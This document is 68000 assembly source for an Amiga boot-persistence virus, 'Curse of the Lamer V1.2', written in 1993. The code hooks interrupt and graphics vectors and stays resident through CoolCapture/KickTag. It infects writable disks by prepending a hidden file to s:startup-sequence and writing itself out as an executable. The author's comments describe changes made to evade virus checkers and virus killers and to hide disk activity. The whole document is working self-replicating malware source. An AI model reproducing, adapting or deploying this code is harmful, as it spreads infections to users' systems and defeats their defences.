

; This is a computer virus designed mainly to be smaller and swifter than
; the "Revenge of the Lamer Exterminator" virus which I dl'ed recently...
; After the -uh- fiftieth generation, it will change the initial text in the
; CLI to my callsign.


;                    *///////////////////////////////*

;                     CURSE OF THE "LAMER" VIRUS V1.2

;                         ACE31175 -- 2/15..16/93

;                    *///////////////////////////////*

; 2/22/93 -- refitted to defeat some coolcapture checkers

; 2/24/93 -- refitted to defeat all current coolcapture checkers, to fix
;            the disk light so it looks more natural during booting, and to
;            reduce risk of viruskillers finding a "revenge-like" alteration
;            to the startup-sequence

startcode:
  move.l 4,a0
  cmp.l  #$f80000,$68
  blt    alreadyinfected
  bsr    getmem
  bsr    copycode
  add.l  #1,12+$7e000+generations-startcode
  bsr    interruptlink
alreadyinfected:
  clr.l  d0
  rts

getmem:
  move.l 4,a6
  move.l #112+endcode-startcode,d0
  move.l #$7e000,a1
  jsr    -204(a6)
infinity:
  tst.l  d0
  beq    infinity
  rts

copycode:
  lea    startcode,a0
  lea    $7e000,a1
  move.l #endcode-startcode-1,d0
copier:
  move.b (a0)+,(a1)+
  dbf.l  d0,copier
  rts

makeresident:
  move.l a0,-(sp)
  move.l 4,a0
  move.l #$7e000+structurex-startcode,$226(a0)
  move.l #$7e007+structurex-startcode,$22a(a0)
  move.l (sp)+,a0
  rts
structurex:
  dc.l   $7e008+structurex-startcode,0
  dc.w   $4afc
  dc.l   $7d000,$7d100,$012109ff,$7d200,$7d300,$7e000+reinstaller-startcode

textlink:
  movem.l d0-d7/a0-a6,-(sp)
  move.l 4,a6
  lea    grname(pc),a1
  jsr    -408(a6)
  move.l d0,a0
  move.l -58(a0),$7e002+jumper-startcode
  move.l #$7e000+texthandler-startcode,-58(a0)
  movem.l (sp)+,d0-d7/a0-a6
  rts
grname:
  dc.b   'graphics.library'
  dc.w   0

interruptlink:
  move.l $68,$7e002+ijump-startcode
  move.l #$7e000+ihandler-startcode,$68
  rts

ihandler:
  move.l d0,-(sp)
  move.b $bfec01,d0
  bclr.b #0,d0
  cmp.b  #56,d0
  beq    preparecoolcapture
  cmp.b  #50,d0
  beq    preparecoolcapture
  cmp.b  #48,d0
  beq    preparecoolcapture
  cmp.b  #78,d0
  beq    preparecoolcapture
  move.l a0,d0
  move.l 4,a0
  clr.l  $226(a0)
  clr.l  $22a(a0)
  move.l d0,a0
  bra    dontprepare
preparecoolcapture:
  bsr    makeresident
dontprepare:
  move.l (sp)+,d0
ijump:
  jmp    $fffffe

trackdisker:
  movem.l d0-d7/a0-a6,-(sp)
  move.l 4,a6
  lea    endcode(pc),a1
  move.l #$7e050+endcode-startcode,14(a1)
  clr.l  d1
  clr.l  d0
  lea    tdname(pc),a0
  jsr    -444(a6)
  lea    tdbase(pc),a0
  move.l #$7e000+endcode-startcode,(a0)
  movem.l (sp)+,d0-d7/a0-a6
  rts

reinstaller:
  move.l 4,a6
  clr.l  $226(a6)
  clr.l  $22a(a6)
  bsr    getmem
  bsr    textlink
  rts
tdbase:
  dc.l   0
tdname:
  dc.b   'trackdisk.device'
  dc.w   0

texthandler:
  movem.l d0-d7/a0-a6,-(sp)
  bsr    trackdisker
  bsr    interruptlink
  movem.l (sp)+,d0-d7/a0-a6
  move.l #$7e000+pause0-startcode,-58(a6)
  bra    jumper
pause0:
  move.l #$7e000+pause1-startcode,-58(a6)
  bra    jumper
pause1:
  move.l #$7e000+pause2-startcode,-58(a6)
  bra    jumper
pause2:
  move.l #$7e000+pause3-startcode,-58(a6)
  bra    jumper
pause3:
  cmp.l  #50,12+$7e000+generations-startcode
  beq    package
  move.l #$7e000+pause4-startcode,-58(a6)
  bra    jumper
pause4:
  move.l #$7e000+pause5-startcode,-58(a6)
  bra    jumper
pause5:
  move.l a6,-(sp)
  bsr    jumper
  move.l (sp)+,a6
pause6:
  move.l $7e002+jumper-startcode,-58(a6)
  movem.l d0-d7/a0-a6,-(sp)
  lea    tdbase(pc),a0
  move.l (a0),a1
  move.w #15,28(a1)
  move.l 4,a6
  jsr    -462(a6)
  lea    tdbase(pc),a0
  move.l (a0),a1
  tst.l  32(a1)
  bne    dontinfect
  bsr    opendos
  bsr    readstartup
  cmp.l  #$a0a0a020,$7e0a0+endcode-startcode
  beq    dontinfect
  bsr    fixstartup
  bsr    writevirus
dontinfect:
  movem.l (sp)+,d0-d7/a0-a6
  rts
jumper:
  jmp    $fffffe

opendos:
  move.l 4,a6
  lea    dosname(pc),a1
  jsr    -408(a6)
  move.l d0,$7e000+dosbase-startcode
  rts
dosname:
  dc.b   'dos.library',0
dosbase:
  dc.l   0

readstartup:
  move.l $7e000+dosbase-startcode,a6
  move.l #$7e000+startupname-startcode,d1
  move.l #1005,d2
  jsr    -30(a6)
  move.l d0,$7e000+filehandle-startcode
  bne    fileokay0
  add.l  #4,sp
  bra    dontinfect
fileokay0:
  move.l $7e000+dosbase-startcode,a6
  move.l d0,d1
  move.l #$7e0a0+endcode-startcode,d2
  move.l #10000,d3
  jsr    -42(a6)
  move.l d0,$7e000+filelength-startcode
  move.l $7e000+dosbase-startcode,a6
  move.l $7e000+filehandle-startcode,d1
  jsr    -36(a6)
  rts
startupname:
  dc.b   's:startup-sequence',0,0
filehandle:
  dc.l   0
filelength:
  dc.l   0

fixstartup:
  move.l $7e000+dosbase-startcode,a6
  move.l #$7e000+startupname-startcode,d1
  move.l #1006,d2
  jsr    -30(a6)
  move.l d0,$7e000+filehandle-startcode
  bne    fileokay1
  add.l  #4,sp
  bra    dontinfect
fileokay1:
  move.l $7e000+dosbase-startcode,a6
  move.l d0,d1
  move.l #$7e000+vname-startcode,d2
  move.l #6,d3
  jsr    -48(a6)
  move.l $7e000+dosbase-startcode,a6
  move.l $7e000+filehandle-startcode,d1
  move.l #$7e0a0+endcode-startcode,d2
  move.l $7e000+filelength-startcode,d3
  jsr    -48(a6)
  move.l $7e000+dosbase-startcode,a6
  move.l $7e000+filehandle-startcode,d1
  jsr    -36(a6)
  rts
vname:
  dc.b   $a0,$a0,$a0,$20,$a0,$0a
vname2:
  dc.b   $a0,$a0,$a0,0

writevirus:
  move.l $7e000+dosbase-startcode,a6
  move.l #$7e000+vname2-startcode,d1
  move.l #1006,d2
  jsr    -30(a6)
  move.l d0,$7e000+filehandle-startcode
  move.l $7e000+dosbase-startcode,a6
  move.l d0,d1
  move.l #$7e000+header-startcode,d2
  move.l #$20,d3
  jsr    -48(a6)
  move.l $7e000+dosbase-startcode,a6
  move.l $7e000+filehandle-startcode,d1
  move.l #$7e000,d2
  move.l #endcode-startcode,d3
  jsr    -48(a6)
  move.l $7e000+dosbase-startcode,a6
  move.l $7e000+filehandle-startcode,d1
  move.l #$7e000+tailer-startcode,d2
  move.l #4,d3
  jsr    -48(a6)
  move.l $7e000+dosbase-startcode,a6
  move.l $7e000+filehandle-startcode,d1
  jsr    -36(a6)
  rts
header:
  dc.l   $3f3,0,1,0,0,(endcode-startcode)/4,$3e9,(endcode-startcode)/4
tailer:
  dc.l   $3f2

package:
  move.l #$7e000+line0-startcode,a0
  move.l #56,d0
  move.l #$7e000+ppause0-startcode,-58(a6)
  bra    jumper
ppause0:
  move.l #$7e000+line1-startcode,a0
  move.l #56,d0
  move.l #$7e000+ppause1-startcode,-58(a6)
  bra    jumper
ppause1:
  move.l #$7e000+line2-startcode,a0
  move.l #56,d0
  move.l a6,-(sp)
  bsr    jumper
  move.l (sp)+,a6
  bra    pause6

generations:
  dc.b   'GENERATIONS:'
  dc.l   0

line0:
  dc.b   '  ___  ___ ___ ___  _ _  ___  ___             __  __  __'
line1:
  dc.b   ' /__/ /   /_     _\  \ \ \  \ \___  __ __  / |_/ |_/  _/'
line2:
  dc.b   '/  / /__ /__     __\  \ \    \  __\       /   /   / __/ '

endcode:
  end


